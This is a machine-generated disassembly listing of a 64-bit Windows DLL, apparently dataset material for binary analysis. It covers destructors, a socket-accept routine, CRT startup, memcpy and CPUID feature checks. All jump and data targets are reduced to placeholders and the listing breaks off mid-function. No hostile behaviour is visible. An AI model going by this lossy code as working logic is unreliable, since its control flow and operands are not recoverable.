sub_180001000
push rdi
push r12
sub rsp 0x28
lea r8 [ rw-data ]
mov rdi rcx
mov r12 rdx
mov [ rdi ] r8
mov rcx rdi
call sub_180012c00
mov rcx rdi
call sub_1800117f0
test r12 0x1
je r-xdata
mov rax rdi
add rsp 0x28
pop r12
pop rdi
retn
mov rcx rdi
call sub_1800228a0
sub_180001050
push rbx
push rbp
sub rsp 0x28
mov rbx rcx
lea r8 [ rw-data ]
lea r9 [ rw-data ]
mov rbp rdx
mov [ rbx ] r8
lea rcx [ rbx + 0xe8 ]
mov [ rbx + 0xe0 ] r9
call [ DeleteCriticalSection@IAT ]
mov rcx [ rbx + 0x110 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1800117f0
test rbp 0x1
je r-xdata
call [ free@IAT ]
mov rax rbx
add rsp 0x28
pop rbp
pop rbx
retn
mov rcx rbx
call sub_1800228a0
sub_1800010c0
push rsi
push rbp
sub rsp 0x28
mov rbp rcx
lea r8 [ rw-data ]
mov rsi rdx
mov [ rbp ] r8
lea rcx [ rbp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
mov rcx [ rbp + 0x30 ]
test rcx rcx
je r-xdata
test rsi 0x1
je r-xdata
call [ free@IAT ]
mov rax rbp
add rsp 0x28
pop rbp
pop rsi
retn
mov rcx rbp
call sub_1800228a0
sub_180001110
push r12
push r13
sub rsp 0x28
mov r12 rdx
mov r13 rcx
call sub_180015940
test r12 0x1
je r-xdata
mov rax r13
add rsp 0x28
pop r13
pop r12
retn
mov rcx r13
call sub_1800228a0
sub_180001140
push r15
sub rsp 0x20
mov r15d edx
cmp r15d 0xffffffff
je r-xdata
xor eax eax
add rsp 0x20
pop r15
retn
mov eax r15d
shr eax 0x10
cmp ax r15w
jne r-xdata
mov ecx r15d
mov edx 0x4
call sub_180015920
and r15d 0xffff0000
mov edx 0x1
shr r15d 0x10
xor r8d r8d
cmp r15w ax
cmove r8d edx
xor r8d r8d
jmp r-xdata
mov eax r8d
add rsp 0x20
pop r15
retn
sub_1800011a0
push rbp
sub rsp 0x40
lea rbp [ rsp + 0x20 ]
lea r8 [ rw-data ]
mov [ rbp + 0x18 ] rdi
mov rdi rcx
mov [ rbp + 0x10 ] r12
mov r12 rdx
mov [ rbp ] 0xfffffffffffffffe
mov [ rbp + 0x8 ] rdi
mov [ rdi ] r8
cmp [ rdi + 0x20010 ] 0x0
jle r-xdata
cmp [ rdi + 0x20018 ] 0x0
jle r-xdata
lea rcx [ rdi + 0x20010 ]
call sub_18001f320
mov rdx [ rdi ]
mov rcx rdi
call [ rdx + 0x78 ]
nop
mov rcx rdi
call sub_180015940
test r12 0x1
je r-xdata
lea rcx [ rdi + 0x20018 ]
call sub_18001f320
mov rax rdi
mov rdi [ rbp + 0x18 ]
mov r12 [ rbp + 0x10 ]
lea rsp [ rbp + 0x20 ]
pop rbp
retn
mov rcx rdi
call sub_1800228a0
sub_180001250
push rbx
push rsi
push r14
push r15
push rbp
sub rsp 0x20
mov r14d edx
mov r15d ecx
call [ rand@IAT ]
mov ebp eax
call [ rand@IAT ]
mov ebx eax
call [ rand@IAT ]
mov esi eax
call [ rand@IAT ]
movzx ebx bl
sub r14d r15d
shl ebp 0x18
xor edx edx
shl ebx 0x10
movzx esi sil
or ebp ebx
shl esi 0x8
movzx eax al
or ebp esi
or ebp eax
mov eax ebp
div r14d
add r15d edx
mov eax r15d
add rsp 0x20
pop rbp
pop r15
pop r14
pop rsi
pop rbx
retn
sub_1800012c0
push r14
sub rsp 0x60
mov edx 0x8004667e
mov rax [ rw-data ]
lea r8 [ rsp + 0x40 ]
xor rax rsp
mov r14 rcx
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x40 ] 0x1
call [ ioctlsocket@IAT ]
mov rcx r14
lea rdx [ rsp + 0x48 ]
mov [ rsp + 0x44 ] 0x10
lea r8 [ rsp + 0x44 ]
call [ accept@IAT ]
mov rcx r14
mov edx 0x8004667e
mov [ rsp + 0x30 ] rax
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x40 ] 0x0
call [ ioctlsocket@IAT ]
mov rcx [ rsp + 0x30 ]
test rcx rcx
jl r-xdata
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_1800039d0
xor eax eax
add rsp 0x60
pop r14
retn
mov edx 0x8004667e
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x40 ] 0x0
call [ ioctlsocket@IAT ]
mov edx 0xa
mov rcx [ rsp + 0x30 ]
call sub_18001d7f0
test eax eax
jle r-xdata
lea rcx [ rsp + 0x30 ]
call sub_18001f320
mov r8 rsp
mov edx 0x5
mov [ rsp + 0x3a ] dx
mov edx 0xffff
mov rcx [ rsp + 0x30 ]
lea r9 [ rsp + 0x38 ]
mov eax 0x1
mov [ r8 + 0x20 ] 0x4
mov r8d 0x80
mov [ rsp + 0x38 ] ax
call [ setsockopt@IAT ]
mov rax rsp
mov edx 0x6
mov rcx [ rsp + 0x30 ]
mov r8d 0x1
mov [ rsp + 0x3c ] 0x1
lea r9 [ rsp + 0x3c ]
mov [ rax + 0x20 ] 0x4
call [ setsockopt@IAT ]
mov rcx [ rsp + 0x58 ]
xor rcx rsp
mov r14 [ rsp + 0x30 ]
call sub_1800039d0
mov rax r14
add rsp 0x60
pop r14
retn
sub_180001410
push r12
push r13
sub rsp 0x28
mov r12 rdx
mov r13 rcx
call sub_1800117f0
test r12 0x1
je r-xdata
mov rax r13
add rsp 0x28
pop r13
pop r12
retn
mov rcx r13
call sub_1800228a0
sub_180001440
push rsi
push rbp
sub rsp 0x28
mov rbp rcx
lea r8 [ rw-data ]
mov rsi rdx
mov [ rbp ] r8
lea rcx [ rbp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
mov rcx [ rbp + 0x30 ]
test rcx rcx
je r-xdata
test rsi 0x1
je r-xdata
call [ free@IAT ]
mov rax rbp
add rsp 0x28
pop rbp
pop rsi
retn
mov rcx rbp
call sub_1800228a0
sub_180001490
push r13
push r14
push r15
push rbp
sub rsp 0x28
lea r8 [ rw-data ]
mov rbp rcx
mov r15 rdx
mov [ rbp ] r8
xor edx edx
xor r8d r8d
mov r14d edx
mov r13 r8
inc r14d
add r13 0x10
cmp r14d 0x400
jb r-xdata
cmp [ r13 + rbp + 0xe8 ] 0x0
je r-xdata
cmp [ r13 + rbp + 0xe0 ] 0x0
je r-xdata
lea rcx [ rbp + 0x40e0 ]
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_1800117f0
test r15 0x1
je r-xdata
lea rcx [ r13 + rbp + 0xe8 ]
call sub_18001f320
mov rax rbp
add rsp 0x28
pop rbp
pop r15
pop r14
pop r13
retn
mov rcx rbp
call sub_1800228a0
sub_180001520
push rdi
push r12
sub rsp 0x28
mov rdi rcx
lea r8 [ rw-data ]
mov r12 rdx
mov [ rdi ] r8
call sub_1800117f0
test r12 0x1
je r-xdata
mov rax rdi
add rsp 0x28
pop r12
pop rdi
retn
mov rcx rdi
call sub_1800228a0
sub_180001560
push rsi
push rdi
sub rsp 0x28
mov rsi rcx
lea r8 [ rw-data ]
mov rdi rdx
mov rcx [ rsi + 0x78 ]
test rcx rcx
mov [ rsi ] r8
mov [ rsi + 0x70 ] 0x1
je r-xdata
test rdi 0x1
je r-xdata
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rsi + 0x78 ]
xor edx edx
call [ TerminateThread@IAT ]
mov rcx [ rsi + 0x78 ]
call [ CloseHandle@IAT ]
mov rax rsi
add rsp 0x28
pop rdi
pop rsi
retn
mov rcx rsi
call sub_1800228a0
sub_1800015c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_180003a10
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call __CxxFrameHandler
mov r8d eax
sub_180001650
sub rsp 0x28
mov ecx 0x100
call [ malloc@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rax rax
jne r-xdata
and [ rax ] 0x0
xor eax eax
mov eax 0x1
jmp r-xdata
add rsp 0x28
retn
sub_180001684
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
xor ebx ebx
mov r12 r8
mov r13 rcx
cmp edx ebx
jne r-xdata
mov edi 0x1
cmp edx edi
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
jle r-xdata
mov eax edi
mov rax [ gs : 0x30 ]
mov ebp ebx
mov rsi [ rax + 0x8 ]
jmp r-xdata
xor eax eax
jmp r-xdata
lea edi [ rbx + 0x1 ]
sub eax edi
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
[ rw-data ] rsi
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
xor eax eax
[ rw-data ] rdi
jne r-xdata
cmp rax rsi
je r-xdata
jmp r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ebp edi
mov ecx 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov rbp [ rw-data ]
cmp rbp rbx
je r-xdata
mov ecx 0x1f
call _amsg_exit
jmp r-xdata
lea rsi [ r--data ]
lea r14 [ r--data ]
mov [ rw-data ] edi
mov eax ebx
cmp rsi r14
jae r-xdata
mov ecx 0x1f
call _amsg_exit
jmp r-xdata
mov [ rw-data ] ebx
xchg [ rw-data ] rbx
jmp r-xdata
mov rsi [ rw-data ]
add rsi 0xfffffffffffffff8
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call _initterm
mov [ rw-data ] 0x2
cmp eax ebx
jne r-xdata
cmp ebp ebx
jne r-xdata
cmp rsi rbp
jae r-xdata
cmp [ rw-data ] rbx
je r-xdata
mov rax rbx
xchg [ rw-data ] rax
mov rcx [ rsi ]
cmp rcx rbx
je r-xdata
mov rax [ rsi ]
cmp rax rbx
je r-xdata
mov rcx rbp
call [ free@IAT ]
mov [ rw-data ] rbx
mov [ rw-data ] rbx
add [ rw-data ] edi
lea rcx [ rw-data ]
call sub_180001b08
cmp eax ebx
je r-xdata
add rsi 0x8
cmp rsi r14
jb r-xdata
call rcx
sub rsi 0x8
call rax
mov r8 r12
mov edx 0x2
mov rcx r13
call [ rw-data ]
cmp eax ebx
jne r-xdata
sub_180001858
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
sub rsp 0x140
mov edi edx
mov rsi rcx
mov ebx 0x1
mov [ rsp + 0x20 ] ebx
mov [ rw-data ] edx
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov rax [ rw-data ]
test rax rax
je r-xdata
cmp edx 0x2
jne r-xdata
xor ebx ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
test ebx ebx
je r-xdata
mov [ rw-data ] 0x1
mov r8 [ rsp + 0x170 ]
call rax
mov ebx eax
mov [ rsp + 0x20 ] eax
jmp r-xdata
mov r8 [ rsp + 0x170 ]
mov edx edi
mov rcx rsi
call sub_180010000
mov [ rw-data ] 0xffffffff
mov eax ebx
add rsp 0x140
pop rdi
pop rsi
pop rbx
retn
test ebx ebx
je r-xdata
mov r8 [ rsp + 0x170 ]
mov edx edi
mov rcx rsi
call sub_180001684
mov ebx eax
mov [ rsp + 0x20 ] eax
jmp r-xdata
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180001858
call sub_180001b4c
sub_180001a90
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180001ac0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180001b08
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_180001a90
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180001ac0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_180001b4c
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180001c10
jmp r-xdata
cmp r8 0x1
mov rax rcx
jne r-xdata
lea r11 [ jump_table_18000f040 ]
cmp r8 0x8
jg r-xdata
mov r9b [ rdx ]
mov [ rcx ] r9b
retn
test rcx 0x7
jne r-xdata
add rcx r8
add rdx r8
jmp [ r11 + r8 * 8 ]
lea r11 [ jump_table_18000f000 ]
mov r9 rcx
and r9 0x7
jmp [ r11 + r9 * 8 ]
lea r11 [ jump_table_18000f040 ]
cmp r8 0xb0
jg r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
add rcx r8
add rdx r8
jmp [ r11 + r8 * 8 ]
mov r9d [ rw-data ]
cmp r8 r9
jg r-xdata
test rcx 0xf
jne r-xdata
sub r8 0x40
prefetchnta [ rdx + 0x180 ]
mov r9 [ rdx ]
movnti [ rcx ] r9
mov r10 [ rdx + 0x8 ]
movnti [ rcx + 0x8 ] r10
mov r11 [ rdx + 0x10 ]
movnti [ rcx + 0x10 ] r11
mov r9 [ rdx + 0x18 ]
movnti [ rcx + 0x18 ] r9
mov r10 [ rdx + 0x20 ]
movnti [ rcx + 0x20 ] r10
mov r11 [ rdx + 0x28 ]
movnti [ rcx + 0x28 ] r11
mov r9 [ rdx + 0x30 ]
movnti [ rcx + 0x30 ] r9
mov r10 [ rdx + 0x38 ]
movnti [ rcx + 0x38 ] r10
lea rdx [ rdx + 0x40 ]
lea rcx [ rcx + 0x40 ]
cmp r8 0x40
jge r-xdata
jmp r-xdata
mov r9 [ rdx ]
mov [ rcx ] r9
add rcx 0x8
add rdx 0x8
sub r8 0x8
jmp r-xdata
xor r9 r9
mov r9d [ rw-data ]
cmp r8 r9
jg r-xdata
sfence
jmp r-xdata
mov r9 [ rdx ]
mov r10 [ rdx + 0x8 ]
lea r8 [ r8 - 0x40 ]
mov [ rcx ] r9
mov [ rcx + 0x8 ] r10
mov r11 [ rdx + 0x10 ]
mov r9 [ rdx + 0x18 ]
mov [ rcx + 0x10 ] r11
mov [ rcx + 0x18 ] r9
cmp r8 0x40
mov r10 [ rdx + 0x20 ]
mov r11 [ rdx + 0x28 ]
mov [ rcx + 0x20 ] r10
mov [ rcx + 0x28 ] r11
mov r9 [ rdx + 0x30 ]
mov r10 [ rdx + 0x38 ]
lea rdx [ rdx + 0x40 ]
mov [ rcx + 0x30 ] r9
mov [ rcx + 0x38 ] r10
lea rcx [ rcx + 0x40 ]
jg r-xdata
lea rcx [ rcx + 0x40 ]
lea rdx [ rdx + 0x40 ]
lea r8 [ r8 - 0x40 ]
prefetchnta [ rdx + 0x180 ]
movdqu xmm0 [ rdx - 0x40 ]
movdqu xmm1 [ rdx - 0x30 ]
cmp r8 0x40
movntdq [ rcx - 0x40 ] xmm0
movntdq [ rcx - 0x30 ] xmm1
movdqu xmm2 [ rdx - 0x20 ]
movdqu xmm3 [ rdx - 0x10 ]
movntdq [ rcx - 0x20 ] xmm2
movntdq [ rcx - 0x10 ] xmm3
jge r-xdata
test rdx 0xf
je r-xdata
lea r10 [ jump_table_18000f040 ]
lea rdx [ r8 + rdx ]
lea rcx [ r8 + rcx ]
jmp [ r10 + r8 * 8 ]
lea r10 [ r--data ]
mov r9 r8
shr r9 0x4
shl r9 0x4
add rcx r9
add rdx r9
sub r8 r9
shr r9 0x4
sfence
jmp [ r10 + r9 * 8 ]
movdqa xmm0 [ rdx ]
movdqa xmm1 [ rdx + 0x10 ]
movdqa [ rcx ] xmm0
movdqa [ rcx + 0x10 ] xmm1
lea r8 [ r8 - 0x80 ]
movdqa xmm2 [ rdx + 0x20 ]
movdqa xmm3 [ rdx + 0x30 ]
movdqa [ rcx + 0x20 ] xmm2
movdqa [ rcx + 0x30 ] xmm3
movdqa xmm0 [ rdx + 0x40 ]
movdqa xmm1 [ rdx + 0x50 ]
cmp r8 0xa8
movdqa [ rcx + 0x40 ] xmm0
movdqa [ rcx + 0x50 ] xmm1
movdqa xmm2 [ rdx + 0x60 ]
movdqa xmm3 [ rdx + 0x70 ]
lea rdx [ rdx + 0x80 ]
movdqa [ rcx + 0x60 ] xmm2
movdqa [ rcx + 0x70 ] xmm3
lea rcx [ rcx + 0x80 ]
jge r-xdata
lea r10 [ jump_table_18000f600 ]
mov r11 rdx
and r11 0xf
movdqu xmm0 [ rdx ]
movdqa [ rcx ] xmm0
add rdx 0x10
sub rdx r11
add rcx 0x10
sub r8 0x10
movdqa xmm1 [ rdx ]
jmp [ r10 + r11 * 8 ]
lea r10 [ jump_table_18000f040 ]
add rcx r8
add rdx r8
jmp [ r10 + r8 * 8 ]
sub_180001c20
sub rsp 0xa0
movups [ rsp + 0x90 ] xmm15
movups [ rsp + 0x80 ] xmm14
movups [ rsp + 0x70 ] xmm13
movups [ rsp + 0x60 ] xmm12
movups [ rsp + 0x50 ] xmm11
movups [ rsp + 0x40 ] xmm10
movups [ rsp + 0x30 ] xmm9
movups [ rsp + 0x20 ] xmm8
movups [ rsp + 0x10 ] xmm7
movups [ rsp ] xmm6
test [ rw-data ] 0x1
je r-xdata
movups xmm6 [ rsp ]
movups xmm7 [ rsp + 0x10 ]
movups xmm8 [ rsp + 0x20 ]
movups xmm9 [ rsp + 0x30 ]
movups xmm10 [ rsp + 0x40 ]
movups xmm11 [ rsp + 0x50 ]
movups xmm12 [ rsp + 0x60 ]
movups xmm13 [ rsp + 0x70 ]
movups xmm14 [ rsp + 0x80 ]
movups xmm15 [ rsp + 0x90 ]
add rsp 0xa0
jmp sub_180001c10
sub rsp 0x8
call sub_180002de0
add rsp 0x8
jmp r-xdata
movups xmm6 [ rsp ]
movups xmm7 [ rsp + 0x10 ]
movups xmm8 [ rsp + 0x20 ]
movups xmm9 [ rsp + 0x30 ]
movups xmm10 [ rsp + 0x40 ]
movups xmm11 [ rsp + 0x50 ]
movups xmm12 [ rsp + 0x60 ]
movups xmm13 [ rsp + 0x70 ]
movups xmm14 [ rsp + 0x80 ]
movups xmm15 [ rsp + 0x90 ]
add rsp 0xa0
jmp sub_180001c00
mov rax [ rw-data ]
and rax 0x7f
cmp rax 0x7f
jne r-xdata
sub_180002de0
push rax
push rdx
push rcx
push r8
push r9
push r10
push r11
sub rsp 0x20
mov ecx 0x1
call sub_180002e10
add rsp 0x20
pop r11
pop r10
pop r9
pop r8
pop rcx
pop rdx
pop rax
retn
sub_180002e10
push rbx
push rdi
push rbp
sub rsp 0x30
mov r11d ecx
xor eax eax
cpuid
mov [ rsp + 0x20 ] eax
mov [ rsp + 0x24 ] ebx
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x2c ] edx
xor bpl bpl
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov [ rw-data ] 0x1
add rsp 0x30
pop rbp
pop rdi
pop rbx
retn
cmp r11d 0x1
je r-xdata
cmp [ rsp + 0x24 ] 0x756e6547
jne r-xdata
cmp [ rsp + 0x2c ] 0x49656e69
jne r-xdata
cmp [ rsp + 0x28 ] 0x6c65746e
jne r-xdata
jmp sub_180002e46
sub_180002e46
mov eax 0x1
cpuid
mov r8d edx
mov r9d eax
and r8d 0x1
mov edi ecx
lea r8 [ r8 * 2 + 0x1 ]
mov rax r8
or rax 0x4
test edx 0x8000
cmovne r8 rax
mov rcx r8
or rcx 0x8
test edx 0x800000
cmovne r8 rcx
test edx 0x1000000
je r-xdata
mov rax r8
or rax 0x20000
test edi 0x40000000
cmovne r8 rax
test bpl bpl
jne sub_180002f9e
sub_180002e8f
or r8 0x10
mov r10 r8
or r10 0x20
test edx 0x2000000
cmovne r8 r10
mov rbp r8
or rbp 0x40
test edx 0x4000000
cmovne r8 rbp
mov r10 r8
or r10 0x80
test edi 0x1
cmovne r8 r10
mov rax r8
or rax 0x100
test edi 0x200
cmovne r8 rax
mov rbx r8
or rbx 0x800
test edi 0x400000
cmovne r8 rbx
mov rcx r8
or rcx 0x200
test edi 0x80000
cmovne r8 rcx
mov rdx r8
or rdx 0x400
test edi 0x100000
cmovne r8 rdx
mov r10 r8
or r10 0x1000
test edi 0x800000
cmovne r8 r10
mov rbp r8
or rbp 0x2000
test edi 0x2
cmovne r8 rbp
mov bpl 0x1
mov rax r8
or rax 0x4000
test edi 0x2000000
cmovne r8 rax
mov eax 0x7
xor ecx ecx
cpuid
mov r10d ebx
mov rbx 0x800000000
or rbx r8
test r10d 0x20000000
cmovne r8 rbx
mov rax r8
or rax 0x20000
test edi 0x40000000
cmovne r8 rax
test bpl bpl
jne sub_180002f9e
sub_180002f9e
mov ebp r10d
mov rcx r8
and ebp 0x108
or rcx 0x80000
cmp ebp 0x108
cmove r8 rcx
mov eax 0x80000001
cpuid
mov rdx r8
or rdx 0x100000
test cl 0x20
cmovne r8 rdx
mov rcx r8
or rcx 0x200000
test r10d 0x10
cmovne r8 rcx
mov rbx r8
or rbx 0x400000
test r10d 0x800
cmovne r8 rbx
mov rbp r8
or rbp 0x10000000
test r10d 0x80000
cmovne r8 rbp
mov rax r8
or rax 0x20000000
test r10d 0x40000
cmovne r8 rax
test edi 0x8000000
je r-xdata
mov eax r9d
shr eax 0xc
shr r9d 0x4
and eax 0xf0
and r9d 0xf
add eax r9d
cmp eax 0x1c
je r-xdata
bts r8 0x1f
cmp eax 0x26
je r-xdata
mov [ rw-data ] r8
mov [ rw-data ] r8
add rsp 0x30
pop rbp
pop rdi
pop rbx
retn
mov [ rw-data ] r8
add rsp 0x30
pop rbp
pop rdi
pop rbx
retn
cmp eax 0x27
jne r-xdata
cmp r11d 0x1
je r-xdata
sub_180003032
xor ecx ecx
xgetbv
or r8 0x1
mov edx eax
and edx 0x6
cmp edx 0x6
jne r-xdata
mov eax r9d
shr eax 0xc
shr r9d 0x4
and eax 0xf0
and r9d 0xf
add eax r9d
cmp eax 0x1c
je r-xdata
mov rdx r8
or rdx 0x10000
test edi 0x10000000
cmovne r8 rdx
mov rcx r8
or rcx 0x8000
test edi 0x20000000
cmovne r8 rcx
mov rbx r8
or rbx 0x800000
test r10d 0x20
cmovne r8 rbx
mov rbp r8
or rbp 0x40000
test edi 0x1000
mov edi eax
cmovne r8 rbp
and edi 0x18
cmp edi 0x18
jne r-xdata
bts r8 0x1f
cmp eax 0x26
je r-xdata
and eax 0xe0
cmp eax 0xe0
jne r-xdata
or r8 0x1
mov rdx 0x1000000000
or rdx r8
test r10d 0x4000
cmovne r8 rdx
mov [ rw-data ] r8
mov [ rw-data ] r8
add rsp 0x30
pop rbp
pop rdi
pop rbx
retn
mov [ rw-data ] r8
add rsp 0x30
pop rbp
pop rdi
pop rbx
retn
cmp eax 0x27
jne r-xdata
or r8 0x1
mov rdx 0x400000000
mov rax r8
mov rcx 0x100000000
or rax 0x8000000
test r10d 0x10000
mov rbx 0x200000000
cmovne r8 rax
or rdx r8
test r10d 0x10000000
cmovne r8 rdx
or rcx r8
test r10d 0x8000000
cmovne r8 rcx
or rbx r8
test r10d 0x4000000
cmovne r8 rbx
cmp r11d 0x1
je r-xdata
sub_1800031c0
push rbp
sub rsp 0x1b0
lea rbp [ rsp + 0x20 ]
xor r9d r9d
xor r10d r10d
mov [ rbp + 0x180 ] rbx
xor r11d r11d
cmp [ rw-data ] 0x0
je r-xdata
mov [ rbp + 0x15c ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov rax 0x69746e6568747541
lea r10 [ rbp + 0x108 ]
mov [ rbp + 0x118 ] rax
mov [ rbp + 0x120 ] 0x444d4163
mov [ rbp + 0x124 ] dl
mov [ rbp + 0x178 ] edx
mov [ rbp + 0x170 ] r10
cmp [ rw-data ] 0x0
jbe r-xdata
mov ecx [ rw-data ]
test ecx ecx
jbe r-xdata
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d ecx
imul r11d [ rw-data ]
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
shl r10d 0xa
shl ecx 0xa
mov eax r10d
mov edx ecx
shr eax 0x1f
shr edx 0x1f
mov [ rw-data ] r10d
add r10d eax
mov [ rw-data ] ecx
add ecx edx
sar r10d 0x1
sar ecx 0x1
mov [ rw-data ] r10d
mov [ rw-data ] ecx
mov [ rw-data ] r11d
jmp r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
sub_180003200
push rbx
mov eax 0x1
cpuid
mov [ rbp + 0x164 ] ebx
mov [ rbp + 0x16c ] edx
mov [ rbp + 0x17c ] eax
pop rbx
mov r9d [ rbp + 0x16c ]
test r9d 0x4000000
je r-xdata
and r9d 0x800000
shr r9d 0x17
mov r9d 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d ecx
imul r11d [ rw-data ]
mov ecx [ rw-data ]
test ecx ecx
jbe r-xdata
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
shl r10d 0xa
shl ecx 0xa
mov eax r10d
mov edx ecx
shr eax 0x1f
shr edx 0x1f
mov [ rw-data ] r10d
add r10d eax
mov [ rw-data ] ecx
add ecx edx
sar r10d 0x1
sar ecx 0x1
mov [ rw-data ] r10d
mov [ rw-data ] ecx
mov [ rw-data ] r11d
jmp r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
sub_18000330d
push rax
push rbx
push rcx
push rdx
mov r8 [ rbp + 0x170 ]
mov eax [ rbp + 0x178 ]
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
pop rdx
pop rcx
pop rbx
pop rax
mov eax [ rbp + 0x118 ]
cmp eax [ rbp + 0x10c ]
jne r-xdata
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
mov eax [ rbp + 0x11c ]
cmp eax [ rbp + 0x114 ]
jne r-xdata
mov eax [ rbp + 0x120 ]
cmp eax [ rbp + 0x110 ]
jne r-xdata
mov [ rbp + 0x160 ] 0x1
mov [ rbp + 0x148 ] r10
sub_18000337a
push rax
push rbx
push rcx
push rdx
mov r8 [ rbp + 0x148 ]
mov eax [ rbp + 0x160 ]
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
pop rdx
pop rcx
pop rbx
pop rax
mov r9d [ rbp + 0x114 ]
and r9d 0x800000
shr r9d 0x17
mov [ rbp + 0x168 ] 0x80000000
mov [ rbp + 0x150 ] r10
sub_1800033c3
push rax
push rbx
push rcx
push rdx
